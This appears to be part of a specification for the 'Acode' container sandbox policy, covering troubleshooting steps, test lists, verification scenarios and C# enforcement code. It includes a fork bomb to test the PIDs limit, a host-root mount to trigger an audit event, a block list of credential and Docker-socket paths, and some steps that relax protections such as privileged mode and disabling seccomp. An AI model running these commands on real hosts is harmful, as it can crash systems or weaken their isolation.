### Issue 1: Container Creation Fails with "Operation not permitted"

**Symptoms:**
- Container creation fails immediately
- Error message: `docker: Error response from daemon: OCI runtime create failed: container_linux.go:380: starting container process caused: process_linux.go:545: container init caused: process_linux.go:508: setting cgroup config for procHooks process caused: Unit libpod-<id>.scope not found: Operation not permitted`
- Container never starts, exits with code 126 or 127

**Causes:**
1. Host system missing required kernel capabilities for cgroups v2
2. User namespace remapping not configured correctly
3. AppArmor or SELinux blocking container initialization
4. Docker daemon running in rootless mode without proper subordinate UID/GID ranges

**Solutions:**

```bash
# Solution 1: Verify kernel supports cgroups v2
cat /sys/fs/cgroup/cgroup.controllers
# Expected: cpu io memory pids

# If empty, enable cgroups v2 in GRUB
sudo nano /etc/default/grub
# Add: GRUB_CMDLINE_LINUX="systemd.unified_cgroup_hierarchy=1"
sudo update-grub
sudo reboot

# Solution 2: Configure subordinate UID/GID for user namespaces
sudo usermod --add-subuids 100000-165535 --add-subgids 100000-165535 $(whoami)
# Restart Docker daemon
sudo systemctl restart docker

# Solution 3: Check AppArmor/SELinux status
sudo aa-status | grep docker
# If docker-default profile is not loaded:
sudo apparmor_parser -r /etc/apparmor.d/docker
sudo systemctl restart docker

# Solution 4: Verify Docker daemon can create cgroups
docker run --rm alpine cat /proc/self/cgroup
# Expected: 0::/docker/<container-id>
```

---

### Issue 2: Network Policy Blocks Legitimate Traffic

**Symptoms:**
- Container cannot reach local package registries (npm, NuGet, PyPI)
- DNS resolution fails inside container
- Error: `getaddrinfo: Temporary failure in name resolution`
- Network mode is set to `none` but user expects internet access

**Causes:**
1. Operating mode is `LocalOnly` or `Airgapped`, which disables network
2. DNS servers not configured in `/etc/resolv.conf` inside container
3. Firewall rules on host blocking Docker bridge network
4. Network policy enforcer rejecting allowed domains

**Solutions:**

```bash
# Solution 1: Verify operating mode allows network
acode config get operating-mode
# Expected: burst or docker (NOT local-only or airgapped)

# If incorrect, update operating mode:
acode config set operating-mode burst

# Solution 2: Configure DNS servers for container
docker run --rm --dns=8.8.8.8 --dns=8.8.4.4 alpine nslookup google.com
# Expected: DNS resolution succeeds

# Add to Acode config (acode.yml):
docker:
  dns:
    - 8.8.8.8
    - 8.8.4.4

# Solution 3: Check host firewall rules
sudo iptables -L DOCKER-USER -n -v
# Look for DROP rules blocking Docker bridge (172.17.0.0/16)

# Allow Docker bridge network:
sudo iptables -I DOCKER-USER -i docker0 -j ACCEPT
sudo iptables -I DOCKER-USER -o docker0 -j ACCEPT

# Solution 4: Add allowed domains to network policy whitelist
acode config set network-policy.allowed-domains "registry.npmjs.org,pypi.org,api.nuget.org"
```

---

### Issue 3: Container Hits Memory/CPU Limits During Build

**Symptoms:**
- Build process terminates with exit code 137 (OOM killed)
- Build freezes at compilation/linking step (CPU throttling)
- Error: `Command killed with signal 9`
- Docker logs show: `OOMKilled: true`

**Causes:**
1. Memory limit (4GB default) too low for large builds (e.g., C++ compilation)
2. CPU quota (2 cores default) insufficient for parallel builds
3. PIDs limit (512 default) too low for build systems spawning many processes
4. Build not optimized (not using cached layers, incremental builds)

**Solutions:**

```bash
# Solution 1: Check current resource limits
docker inspect <container-id> --format '{{.HostConfig.Memory}}'
docker inspect <container-id> --format '{{.HostConfig.CpuQuota}}'
docker inspect <container-id> --format '{{.HostConfig.PidsLimit}}'

# Solution 2: Increase memory limit for large builds
acode config set resource-limits.memory-limit-bytes $((8 * 1024 * 1024 * 1024))  # 8GB

# Solution 3: Increase CPU quota for parallel builds
acode config set resource-limits.cpu-quota 400000  # 4 cores

# Solution 4: Increase PIDs limit if build spawns many processes
acode config set resource-limits.pids-limit 2048

# Solution 5: Optimize build with multi-stage Dockerfile
# Use build cache, layer splitting, .dockerignore
docker build --target builder --tag myapp:build .
docker build --target runtime --tag myapp:latest .

# Solution 6: Monitor resource usage during build
docker stats <container-id>
# Watch for memory% and CPU% approaching limits
```

---

### Issue 4: Volume Mount Fails with "Permission denied"

**Symptoms:**
- Container starts but cannot read/write mounted volumes
- Error: `ls: /workspace: Permission denied`
- Files in mounted volume show `root:root` ownership inside container
- Container running as non-root user (UID 65532) cannot access files

**Causes:**
1. Host files owned by root, container user (UID 65532) has no permissions
2. Volume mounted read-only (`:ro` flag) but container expects read-write
3. SELinux labels on host files preventing container access
4. Volume mount path denied by VolumeMountPolicyEnforcer (not in allowed workspace)

**Solutions:**

```bash
# Solution 1: Fix file ownership on host before mounting
# Option A: Change host files to match container UID (65532)
sudo chown -R 65532:65532 /tmp/acode-workspace-abc123

# Option B: Run container with host user's UID (less secure)
docker run --user $(id -u):$(id -g) -v /workspace ...

# Solution 2: Verify mount is read-write, not read-only
docker inspect <container-id> --format '{{json .HostConfig.Binds}}'
# Expected: "/tmp/acode-workspace-abc123:/workspace:rw" (NOT :ro)

# Solution 3: Fix SELinux labels (if using RHEL/CentOS/Fedora)
ls -Z /tmp/acode-workspace-abc123
# If label is incorrect, relabel for Docker:
sudo chcon -Rt svirt_sandbox_file_t /tmp/acode-workspace-abc123

# Or mount with :Z flag to auto-relabel:
docker run -v /tmp/acode-workspace-abc123:/workspace:Z ...

# Solution 4: Ensure workspace path matches allowed prefixes
# Check policy configuration:
acode config get volume-mount-policy.allowed-path-prefixes
# Expected: ["/tmp/acode-workspace-"]

# If workspace is elsewhere, update policy:
acode config set volume-mount-policy.allowed-path-prefixes "/my/custom/workspace-"
```

---

### Issue 5: Seccomp Policy Blocks Required Syscalls for Build Tools

**Symptoms:**
- Build tools fail with cryptic errors: `Operation not permitted`
- Specific operations fail: `strace`, `gdb`, `perf`, kernel module builds
- Error: `prctl(PR_SET_NO_NEW_PRIVS) failed: Operation not permitted`
- Container runs but advanced debugging/profiling tools don't work

**Causes:**
1. Default Seccomp profile blocks syscalls required by debugging tools
2. Build process requires `ptrace()` for debugging (blocked by Seccomp)
3. Performance profiling requires `perf_event_open()` (blocked for security)
4. Container trying to load kernel modules (blocked, `finit_module`)

**Solutions:**

```bash
# Solution 1: Identify which syscall is being blocked
# Run with strace to see denied syscalls (requires privileged container)
docker run --rm --privileged alpine strace -f <your-command> 2>&1 | grep EPERM

# Solution 2: Create custom Seccomp profile allowing required syscalls
# Copy default profile and add exceptions:
cp /etc/acode/seccomp-default.json /etc/acode/seccomp-debug.json

# Edit seccomp-debug.json to allow ptrace for debugging:
{
  "defaultAction": "SCMP_ACT_ERRNO",
  "syscalls": [
    {
      "names": ["ptrace"],
      "action": "SCMP_ACT_ALLOW",
      "comment": "Allow ptrace for debugging"
    }
  ]
}

# Use custom profile:
acode config set security-policy.seccomp-profile-path /etc/acode/seccomp-debug.json

# Solution 3: For development/debugging ONLY, disable Seccomp (NOT RECOMMENDED)
# This should NEVER be done in production or CI/CD environments
# acode config set security-policy.disable-seccomp true  # DANGEROUS!

# Solution 4: Use alternative tools that don't require blocked syscalls
# Instead of gdb (requires ptrace), use logging/printf debugging
# Instead of perf (requires perf_event_open), use application-level metrics
# Instead of strace (requires ptrace), use Docker logs and audit logs

# Solution 5: Run debugging tools on host, not in container
# Debug the application binary directly on host:
gdb ./myapp
strace -f ./myapp

# Or use Docker exec with relaxed Seccomp:
docker exec --privileged <container-id> gdb /app/myapp
```

---

### Issue 6: Audit Logs Not Generated for Policy Violations

**Symptoms:**
- Policy violations occur but no audit events logged
- `acode audit query` returns empty results
- Audit log file `/var/log/acode/audit.log` does not exist or is empty
- Cannot investigate security incidents due to missing audit trail

**Causes:**
1. Audit logger not initialized or configured correctly
2. Log file path not writable by Acode process
3. Audit logging disabled in configuration
4. Audit events buffered in memory but not flushed to disk
5. Log rotation deleted audit logs before they were archived

**Solutions:**

```bash
# Solution 1: Verify audit logging is enabled
acode config get audit.enabled
# Expected: true

# If disabled, enable it:
acode config set audit.enabled true

# Solution 2: Check audit log file permissions
ls -la /var/log/acode/
# Expected: audit.log should exist and be writable by Acode user

# If missing, create directory and set permissions:
sudo mkdir -p /var/log/acode
sudo chown $(whoami):$(whoami) /var/log/acode
sudo chmod 755 /var/log/acode

# Solution 3: Verify audit logger is initialized in code
# Check Infrastructure layer startup logs:
acode --verbose
# Expected: "Audit logger initialized: /var/log/acode/audit.log"

# Solution 4: Force flush audit events to disk
# Restart Acode service to flush buffered events:
sudo systemctl restart acode

# Or trigger explicit flush via API:
acode audit flush

# Solution 5: Configure audit log retention and rotation
# Edit /etc/logrotate.d/acode:
/var/log/acode/audit.log {
    daily
    rotate 90
    compress
    delaycompress
    notifempty
    create 0644 acode acode
    postrotate
        systemctl reload acode
    endscript
}

# Solution 6: Test audit logging manually
acode task run test --debug
# Trigger a policy violation (e.g., mount denied path):
# docker run -v /:/host alpine ls
# Check audit logs:
acode audit query --event-type volume_mount_policy_violation --last 5m
# Expected: Event logged with details
```

---

## Testing Requirements

### Unit Tests

#### PolicyEnforcerTests

```csharp
[Fact] ApplyPolicy_WithAirGappedMode_SetsNetworkNone()
[Fact] ApplyPolicy_WithLocalOnlyMode_SetsNetworkNone()
[Fact] ApplyPolicy_WithDockerMode_SetsConfiguredNetwork()
[Fact] ApplyPolicy_WithBurstMode_SetsBridgeNetwork()
[Fact] ApplyPolicy_Always_DropsAllCapabilities()
[Fact] ApplyPolicy_Always_SetsNoNewPrivileges()
[Fact] ApplyPolicy_Always_SetsNonRootUser()
[Fact] ApplyPolicy_Always_SetsReadOnlyRootFs()
[Fact] ApplyPolicy_Always_SetsPidsLimit()
[Fact] ApplyPolicy_WithCustomUser_AppliesCustomUser()
[Fact] ApplyPolicy_WithCustomMemory_AppliesCustomMemory()
[Fact] ApplyPolicy_RejectsHostNetwork()
[Fact] ApplyPolicy_RejectsPrivilegedMode()
[Fact] ApplyPolicy_RejectsRootUser()
```

#### NetworkPolicyTests

```csharp
[Fact] BuildNetworkConfig_NoneMode_ReturnsNoneNetwork()
[Fact] BuildNetworkConfig_BridgeMode_ReturnsBridgeNetwork()
[Fact] BuildNetworkConfig_HostMode_ThrowsPolicyViolation()
[Fact] BuildNetworkConfig_WithDns_IncludesDnsConfig()
[Fact] BuildNetworkConfig_WithoutDns_ExcludesDnsConfig()
[Fact] ValidateNetwork_AirGappedWithBridge_ThrowsModeViolation()
[Fact] ValidateNetwork_LocalOnlyWithBridge_ThrowsModeViolation()
```

#### FilesystemPolicyTests

```csharp
[Fact] BuildMounts_IncludesWorkspaceMount()
[Fact] BuildMounts_WorkspaceMountIsReadWrite()
[Fact] BuildMounts_IncludesTmpfsMounts()
[Fact] BuildMounts_TmpfsHasSizeLimit()
[Fact] BuildMounts_RootFsIsReadOnly()
[Fact] ValidateMounts_OutsideRepo_ThrowsPolicyViolation()
[Fact] ValidateMounts_DockerSocket_ThrowsPolicyViolation()
[Fact] ValidateMounts_PropagationIsPrivate()
```

#### ProcessPolicyTests

```csharp
[Fact] BuildUserConfig_DefaultsTo1000()
[Fact] BuildUserConfig_CustomUserApplied()
[Fact] BuildUserConfig_RejectsRoot()
[Fact] BuildCapabilities_DropsAll()
[Fact] BuildSecurityOpts_IncludesNoNewPrivileges()
[Fact] BuildSeccompConfig_DefaultProfile()
[Fact] BuildSeccompConfig_CustomProfile()
[Fact] BuildNamespaceConfig_IsolatesPid()
[Fact] BuildNamespaceConfig_IsolatesIpc()
```

#### ResourcePolicyTests

```csharp
[Fact] BuildResourceConfig_AppliesMemoryLimit()
[Fact] BuildResourceConfig_AppliesCpuQuota()
[Fact] BuildResourceConfig_AppliesPidsLimit()
[Fact] BuildResourceConfig_AppliesUlimits()
[Fact] BuildResourceConfig_EnablesOomKiller()
[Fact] BuildResourceConfig_LimitsSwap()
[Fact] BuildResourceConfig_CustomValues()
```

#### PolicyValidatorTests

```csharp
[Fact] Validate_ValidPolicy_ReturnsSuccess()
[Fact] Validate_RootUser_ReturnsError()
[Fact] Validate_HostNetwork_ReturnsError()
[Fact] Validate_Privileged_ReturnsError()
[Fact] Validate_NegativeMemory_ReturnsError()
[Fact] Validate_ZeroPids_ReturnsError()
[Fact] Validate_ModeMismatch_ReturnsError()
[Fact] Validate_MissingSeccomp_ReturnsWarning()
```

#### AuditLoggerTests

```csharp
[Fact] LogPolicyApplied_IncludesAllDetails()
[Fact] LogViolation_IncludesViolationType()
[Fact] LogOomEvent_IncludesProcessDetails()
[Fact] LogNetworkBlocked_IncludesDestination()
[Fact] GetAuditLog_FiltersByTask_ReturnsFiltered()
[Fact] GetAuditLog_ToJson_ReturnsValidJson()
```

### Integration Tests

#### PolicyEnforcementIntegrationTests

```csharp
[Fact] Container_WithNoneNetwork_CannotReachInternet()
[Fact] Container_WithNonRootUser_CannotEscalate()
[Fact] Container_WithReadOnlyRoot_CannotWriteToRoot()
[Fact] Container_WithPidsLimit_BlocksForkBomb()
[Fact] Container_WithMemoryLimit_TriggersOom()
[Fact] Container_WithSeccomp_BlocksDangerousSyscalls()
```

#### ModeEnforcementIntegrationTests

```csharp
[Fact] AirGappedMode_EnforcesMaxSecurity()
[Fact] LocalOnlyMode_EnforcesDefaultSecurity()
[Fact] DockerMode_AllowsConfiguredRelaxations()
[Fact] BurstMode_AllowsNetworkOnly()
[Fact] ModeOverride_CannotRelaxEnforcedRestrictions()
```

#### AuditIntegrationTests

```csharp
[Fact] PolicyViolation_IsLoggedWithDetails()
[Fact] OomEvent_IsLoggedWithProcess()
[Fact] NetworkBlock_IsLoggedWithDestination()
[Fact] AuditLog_QueryByTaskId_ReturnsCorrect()
```

### E2E Tests

#### PolicyCLIE2ETests

```csharp
[Fact] PolicyShow_DisplaysEffectivePolicy()
[Fact] PolicyValidate_WithValidConfig_Passes()
[Fact] PolicyValidate_WithInvalidConfig_Fails()
[Fact] PolicyAudit_ShowsSecurityEvents()
[Fact] PolicyAudit_JsonOutput_IsValidJson()
```

### Performance Benchmarks

| Benchmark | Target | Threshold |
|-----------|--------|-----------|
| PolicyApplication | < 50ms | P95 |
| PolicyValidation | < 100ms | P95 |
| ModeDetection | < 10ms | P95 |
| AuditLogWrite | < 5ms | P95 |
| SeccompProfileLoad | < 100ms | P95 |
| PolicyInspection | < 200ms | P95 |

### Coverage Requirements

| Component | Minimum Coverage |
|-----------|------------------|
| PolicyEnforcer | 95% |
| NetworkPolicy | 95% |
| FilesystemPolicy | 95% |
| ProcessPolicy | 95% |
| ResourcePolicy | 95% |
| PolicyValidator | 95% |
| AuditLogger | 90% |
| CLI Commands | 85% |
| **Overall** | **92%** |

---

## User Verification Steps

### Scenario 1: Verify Non-Root Execution

```bash
# Run a task
acode task run build

# Inside container, check user
docker exec <container-id> id

# Expected output:
# uid=1000(acode) gid=1000(acode) groups=1000(acode)
# NOT uid=0(root)
```

### Scenario 2: Verify Network Blocked

```bash
# In local-only or air-gapped mode
acode task run test

# Inside container, try network
docker exec <container-id> curl https://google.com

# Expected: Connection fails
# curl: (6) Could not resolve host: google.com
```

### Scenario 3: Verify Read-Only Root

```bash
# Inside container, try to write to root
docker exec <container-id> touch /test-file

# Expected:
# touch: cannot touch '/test-file': Read-only file system
```

### Scenario 4: Verify /workspace Writable

```bash
# Inside container, write to workspace
docker exec <container-id> touch /workspace/test-file

# Expected: Success (no error)

# Verify on host
ls -la /path/to/repo/test-file
# File should exist
```

### Scenario 5: Verify Capabilities Dropped

```bash
# Inside container, check capabilities
docker exec <container-id> cat /proc/1/status | grep Cap

# Expected: All zeros
# CapInh: 0000000000000000
# CapPrm: 0000000000000000
# CapEff: 0000000000000000
```

### Scenario 6: Verify PIDs Limit

```bash
# Inside container, try fork bomb (DON'T DO THIS ON HOST)
docker exec <container-id> bash -c ':(){ :|:& };:'

# Expected: Quickly hits PIDs limit, doesn't crash host
# bash: fork: Resource temporarily unavailable
```

### Scenario 7: Verify OOM Behavior

```bash
# Run memory-intensive task with low limit
acode task run memory-hog

# Check logs
acode policy audit

# Expected: OOM event logged
# EVENT: oom-killed, process=memory-hog, memory=2.1GB
```

### Scenario 8: Verify Policy Inspection

```bash
# Show current policy
acode policy show

# Expected: Full policy displayed with mode, network, resources

# Validate policy
acode policy validate

# Expected: All checks pass or clear errors shown
```

---

## Implementation Prompt

### File Structure

```
src/
├── Acode.Domain/
│   └── Sandbox/
│       ├── Policy/
│       │   ├── ISandboxPolicyEnforcer.cs
│       │   ├── SandboxPolicy.cs
│       │   ├── NetworkPolicy.cs
│       │   ├── FilesystemPolicy.cs
│       │   ├── ProcessPolicy.cs
│       │   ├── ResourcePolicy.cs
│       │   └── PolicyViolation.cs
│       └── Audit/
│           ├── IAuditLogger.cs
│           ├── AuditEvent.cs
│           └── AuditEventType.cs
├── Acode.Infrastructure/
│   └── Sandbox/
│       ├── Policy/
│       │   ├── SandboxPolicyEnforcer.cs
│       │   ├── NetworkPolicyBuilder.cs
│       │   ├── FilesystemPolicyBuilder.cs
│       │   ├── ProcessPolicyBuilder.cs
│       │   ├── ResourcePolicyBuilder.cs
│       │   ├── PolicyValidator.cs
│       │   └── SeccompProfileLoader.cs
│       └── Audit/
│           └── AuditLogger.cs
├── Acode.Cli/
│   └── Commands/
│       └── PolicyCommands.cs
└── tests/
    ├── Acode.Domain.Tests/
    │   └── Sandbox/
    │       └── Policy/
    │           ├── SandboxPolicyTests.cs
    │           └── PolicyViolationTests.cs
    ├── Acode.Infrastructure.Tests/
    │   └── Sandbox/
    │       └── Policy/
    │           ├── PolicyEnforcerTests.cs
    │           ├── NetworkPolicyTests.cs
    │           ├── FilesystemPolicyTests.cs
    │           ├── ProcessPolicyTests.cs
    │           ├── ResourcePolicyTests.cs
    │           └── PolicyValidatorTests.cs
    └── Acode.Integration.Tests/
        └── Sandbox/
            └── Policy/
                ├── PolicyEnforcementTests.cs
                ├── ModeEnforcementTests.cs
                └── AuditIntegrationTests.cs
```

### Domain Models

```csharp
// ISandboxPolicyEnforcer.cs
namespace Acode.Domain.Sandbox.Policy;

public interface ISandboxPolicyEnforcer
{
    Task<SandboxPolicy> BuildPolicyAsync(
        OperatingMode mode,
        PolicyConfiguration? configuration = null,
        CancellationToken cancellationToken = default);
    
    void ApplyToContainer(
        SandboxPolicy policy,
        CreateContainerParameters parameters);
    
    Task<PolicyValidationResult> ValidateAsync(
        SandboxPolicy policy,
        CancellationToken cancellationToken = default);
}

// SandboxPolicy.cs
namespace Acode.Domain.Sandbox.Policy;

public sealed record SandboxPolicy
{
    public required OperatingMode Mode { get; init; }
    public required NetworkPolicy Network { get; init; }
    public required FilesystemPolicy Filesystem { get; init; }
    public required ProcessPolicy Process { get; init; }
    public required ResourcePolicy Resources { get; init; }
    public DateTimeOffset CreatedAt { get; init; } = DateTimeOffset.UtcNow;
}

// NetworkPolicy.cs
namespace Acode.Domain.Sandbox.Policy;

public sealed record NetworkPolicy
{
    public NetworkMode Mode { get; init; } = NetworkMode.None;
    public bool AllowDns { get; init; } = false;
    public string? CustomNetwork { get; init; }
}

public enum NetworkMode
{
    None,
    Bridge,
    Custom
    // Host intentionally excluded
}

// FilesystemPolicy.cs
namespace Acode.Domain.Sandbox.Policy;

public sealed record FilesystemPolicy
{
    public bool ReadOnlyRoot { get; init; } = true;
    public string WorkspacePath { get; init; } = "/workspace";
    public string TmpfsSize { get; init; } = "256m";
    public MountPropagation Propagation { get; init; } = MountPropagation.Private;
    public IReadOnlyList<string> BlockedPaths { get; init; } = new[]
    {
        "/var/run/docker.sock",
        "/etc/shadow",
        "/etc/passwd"
    };
}

// ProcessPolicy.cs
namespace Acode.Domain.Sandbox.Policy;

public sealed record ProcessPolicy
{
    public string User { get; init; } = "1000:1000";
    public IReadOnlyList<string> CapabilitiesToDrop { get; init; } = new[] { "ALL" };
    public IReadOnlyList<string> CapabilitiesToAdd { get; init; } = Array.Empty<string>();
    public bool NoNewPrivileges { get; init; } = true;
    public bool Privileged { get; init; } = false;
    public string? SeccompProfile { get; init; }  // null = default
    public string? AppArmorProfile { get; init; }
    public bool IsolatePid { get; init; } = true;
    public bool IsolateIpc { get; init; } = true;
    public bool IsolateUts { get; init; } = true;
}

// ResourcePolicy.cs
namespace Acode.Domain.Sandbox.Policy;

public sealed record ResourcePolicy
{
    public long MemoryBytes { get; init; } = 2L * 1024 * 1024 * 1024; // 2GB
    public long MemorySwapBytes { get; init; } = 2L * 1024 * 1024 * 1024; // Same as memory (no swap)
    public long CpuQuota { get; init; } = 100000; // 100% of 1 core
    public long CpuPeriod { get; init; } = 100000;
    public int PidsLimit { get; init; } = 512;
    public long NofileLimit { get; init; } = 65536;
    public long NprocLimit { get; init; } = 512;
    public bool OomKillEnabled { get; init; } = true;
}

// PolicyViolation.cs
namespace Acode.Domain.Sandbox.Policy;

public sealed record PolicyViolation
{
    public required PolicyViolationType Type { get; init; }
    public required string Message { get; init; }
    public required string Detail { get; init; }
    public DateTimeOffset Timestamp { get; init; } = DateTimeOffset.UtcNow;
}

public enum PolicyViolationType
{
    NetworkAccess,
    FilesystemAccess,
    PrivilegeEscalation,
    ResourceExceeded,
    ConfigurationInvalid,
    ModeViolation
}

// IAuditLogger.cs
namespace Acode.Domain.Sandbox.Audit;

public interface IAuditLogger
{
    void LogPolicyApplied(string taskId, SandboxPolicy policy);
    void LogViolation(string taskId, PolicyViolation violation);
    void LogOomEvent(string taskId, string processName, long memoryBytes);
    void LogNetworkBlocked(string taskId, string destination);
    void LogFilesystemBlocked(string taskId, string path);
    Task<IReadOnlyList<AuditEvent>> GetEventsAsync(
        string? taskId = null,
        DateTimeOffset? since = null,
        CancellationToken cancellationToken = default);
}

// AuditEvent.cs
namespace Acode.Domain.Sandbox.Audit;

public sealed record AuditEvent
{
    public required string Id { get; init; }
    public required string TaskId { get; init; }
    public required AuditEventType Type { get; init; }
    public required string Message { get; init; }
    public required DateTimeOffset Timestamp { get; init; }
    public IReadOnlyDictionary<string, string> Details { get; init; } = 
        new Dictionary<string, string>();
}

public enum AuditEventType
{
    PolicyApplied,
    NetworkBlocked,
    FilesystemBlocked,
    PrivilegeBlocked,
    OomKilled,
    ResourceThrottled
}
```

### Infrastructure Implementation

```csharp
// SandboxPolicyEnforcer.cs
namespace Acode.Infrastructure.Sandbox.Policy;

public sealed class SandboxPolicyEnforcer : ISandboxPolicyEnforcer
{
    private readonly IOperatingModeService _modeService;
    private readonly IPolicyConfigurationProvider _configProvider;
    private readonly ISeccompProfileLoader _seccompLoader;
    private readonly IAuditLogger _auditLogger;
    private readonly ILogger<SandboxPolicyEnforcer> _logger;
    
    public SandboxPolicyEnforcer(
        IOperatingModeService modeService,
        IPolicyConfigurationProvider configProvider,
        ISeccompProfileLoader seccompLoader,
        IAuditLogger auditLogger,
        ILogger<SandboxPolicyEnforcer> logger)
    {
        _modeService = modeService;
        _configProvider = configProvider;
        _seccompLoader = seccompLoader;
        _auditLogger = auditLogger;
        _logger = logger;
    }
    
    public async Task<SandboxPolicy> BuildPolicyAsync(
        OperatingMode mode,
        PolicyConfiguration? configuration = null,
        CancellationToken cancellationToken = default)
    {
        var config = configuration ?? _configProvider.GetDefault();
        
        // Mode-enforced constraints cannot be overridden
        var networkPolicy = BuildNetworkPolicy(mode, config);
        var filesystemPolicy = BuildFilesystemPolicy(mode, config);
        var processPolicy = BuildProcessPolicy(mode, config);
        var resourcePolicy = BuildResourcePolicy(mode, config);
        
        var policy = new SandboxPolicy
        {
            Mode = mode,
            Network = networkPolicy,
            Filesystem = filesystemPolicy,
            Process = processPolicy,
            Resources = resourcePolicy
        };
        
        _logger.LogDebug("Built policy for mode {Mode}", mode);
        return policy;
    }
    
    public void ApplyToContainer(
        SandboxPolicy policy,
        CreateContainerParameters parameters)
    {
        // Network
        parameters.HostConfig.NetworkMode = policy.Network.Mode switch
        {
            NetworkMode.None => "none",
            NetworkMode.Bridge => "bridge",
            NetworkMode.Custom => policy.Network.CustomNetwork,
            _ => "none"
        };
        
        // Filesystem
        parameters.HostConfig.ReadonlyRootfs = policy.Filesystem.ReadOnlyRoot;
        parameters.HostConfig.Tmpfs = new Dictionary<string, string>
        {
            ["/tmp"] = $"size={policy.Filesystem.TmpfsSize},mode=1777",
            ["/var/tmp"] = $"size={policy.Filesystem.TmpfsSize},mode=1777"
        };
        
        // Process
        parameters.User = policy.Process.User;
        parameters.HostConfig.CapDrop = policy.Process.CapabilitiesToDrop.ToList();
        parameters.HostConfig.CapAdd = policy.Process.CapabilitiesToAdd.ToList();
        parameters.HostConfig.SecurityOpt = new List<string>();
        
        if (policy.Process.NoNewPrivileges)
        {
            parameters.HostConfig.SecurityOpt.Add("no-new-privileges");
        }
        
        if (policy.Process.SeccompProfile is not null)
        {
            parameters.HostConfig.SecurityOpt.Add(
                $"seccomp={policy.Process.SeccompProfile}");
        }
        
        parameters.HostConfig.PidMode = policy.Process.IsolatePid ? "" : "host";
        parameters.HostConfig.IpcMode = policy.Process.IsolateIpc ? "" : "host";
        
        // Resources
        parameters.HostConfig.Memory = policy.Resources.MemoryBytes;
        parameters.HostConfig.MemorySwap = policy.Resources.MemorySwapBytes;
        parameters.HostConfig.CpuQuota = policy.Resources.CpuQuota;
        parameters.HostConfig.CpuPeriod = policy.Resources.CpuPeriod;
        parameters.HostConfig.PidsLimit = policy.Resources.PidsLimit;
        parameters.HostConfig.OomKillDisable = !policy.Resources.OomKillEnabled;
        
        parameters.HostConfig.Ulimits = new List<Ulimit>
        {
            new() { Name = "nofile", Soft = policy.Resources.NofileLimit, Hard = policy.Resources.NofileLimit },
            new() { Name = "nproc", Soft = policy.Resources.NprocLimit, Hard = policy.Resources.NprocLimit }
        };
        
        _logger.LogInformation(
            "Applied security policy: network={Network}, user={User}, memory={Memory}",
            policy.Network.Mode,
            policy.Process.User,
            policy.Resources.MemoryBytes);
    }
    
    private NetworkPolicy BuildNetworkPolicy(OperatingMode mode, PolicyConfiguration config)
    {
        // Mode-enforced restrictions
        return mode switch
        {
            OperatingMode.AirGapped => new NetworkPolicy { Mode = NetworkMode.None },
            OperatingMode.LocalOnly => new NetworkPolicy { Mode = NetworkMode.None },
            OperatingMode.Docker => new NetworkPolicy 
            { 
                Mode = config.Network?.Mode ?? NetworkMode.None,
                AllowDns = config.Network?.AllowDns ?? false
            },
            OperatingMode.Burst => new NetworkPolicy 
            { 
                Mode = NetworkMode.Bridge,
                AllowDns = true
            },
            _ => new NetworkPolicy { Mode = NetworkMode.None }
        };
    }
    
    private ProcessPolicy BuildProcessPolicy(OperatingMode mode, PolicyConfiguration config)
    {
        var user = config.User ?? "1000:1000";
        var userPart = user.Split(':')[0].Trim();
        
        // Validate not root (by username or UID)
        if (string.Equals(userPart, "root", StringComparison.OrdinalIgnoreCase) ||
            (int.TryParse(userPart, out var uid) && uid == 0))
        {
            throw new PolicyViolationException(new PolicyViolation
            {
                Type = PolicyViolationType.ConfigurationInvalid,
                Message = "Root user is not allowed",
                Detail = $"User '{user}' resolves to root"
            });
        }
        
        return new ProcessPolicy
        {
            User = user,
            CapabilitiesToDrop = new[] { "ALL" },
            CapabilitiesToAdd = Array.Empty<string>(),
            NoNewPrivileges = true,
            Privileged = false,
            SeccompProfile = config.SeccompProfile,
            IsolatePid = true,
            IsolateIpc = true,
            IsolateUts = true
        };
    }
    
    private FilesystemPolicy BuildFilesystemPolicy(OperatingMode mode, PolicyConfiguration config)
    {
        return new FilesystemPolicy
        {
            ReadOnlyRoot = true,  // Always enforced
            WorkspacePath = "/workspace",
            TmpfsSize = config.TmpfsSize ?? "256m",
            Propagation = MountPropagation.Private
        };
    }
    
    private ResourcePolicy BuildResourcePolicy(OperatingMode mode, PolicyConfiguration config)
    {
        return new ResourcePolicy
        {
            MemoryBytes = ParseMemory(config.Memory ?? "2g"),
            MemorySwapBytes = ParseMemory(config.Memory ?? "2g"), // No swap
            CpuQuota = config.CpuQuota ?? 100000,
            CpuPeriod = 100000,
            PidsLimit = config.PidsLimit ?? 512,
            NofileLimit = config.NofileLimit ?? 65536,
            NprocLimit = config.PidsLimit ?? 512,
            OomKillEnabled = true
        };
    }
    
    private static long ParseMemory(string memory)
    {
        var value = long.Parse(memory[..^1]);
        return memory[^1] switch
        {
            'g' or 'G' => value * 1024 * 1024 * 1024,
            'm' or 'M' => value * 1024 * 1024,
            'k' or 'K' => value * 1024,
            _ => value
        };
    }
}
```

### Error Codes

| Code | Meaning | Recovery |
|------|---------|----------|
| ACODE-POL-001 | Policy violation detected | Review and correct policy configuration |
| ACODE-POL-002 | Network access denied | Expected in local-only/air-gapped mode |
| ACODE-POL-003 | Filesystem access denied | Cannot write to read-only paths |
| ACODE-POL-004 | Privilege escalation blocked | Cannot run as root or gain capabilities |
| ACODE-POL-005 | Resource limit exceeded | Increase limits in configuration |
| ACODE-POL-006 | Mode violation | Configuration incompatible with mode |
| ACODE-POL-007 | Seccomp profile invalid | Check profile JSON syntax |
| ACODE-POL-008 | Docker feature not supported | Update Docker or use different config |
| ACODE-POL-009 | OOM killed | Process exceeded memory limit |
| ACODE-POL-010 | PIDs limit reached | Fork bomb or too many processes |

### Implementation Checklist

- [ ] Create domain models for all policy types
- [ ] Implement `ISandboxPolicyEnforcer` interface
- [ ] Implement `SandboxPolicyEnforcer` with mode-aware policy building
- [ ] Implement `NetworkPolicyBuilder` for network configuration
- [ ] Implement `FilesystemPolicyBuilder` for mount configuration
- [ ] Implement `ProcessPolicyBuilder` for user/capability configuration
- [ ] Implement `ResourcePolicyBuilder` for limits configuration
- [ ] Implement `PolicyValidator` for pre-start validation
- [ ] Implement `SeccompProfileLoader` for custom profiles
- [ ] Implement `AuditLogger` for security event logging
- [ ] Integrate policy enforcer with `ContainerLifecycleManager`
- [ ] Create CLI `policy show` command
- [ ] Create CLI `policy validate` command
- [ ] Create CLI `policy audit` command
- [ ] Add unit tests for all policy builders
- [ ] Add integration tests for policy enforcement
- [ ] Add E2E tests for CLI commands
- [ ] Document policy configuration in user manual
- [ ] Create default seccomp profile

### Rollout Plan

| Phase | Action | Validation |
|-------|--------|------------|
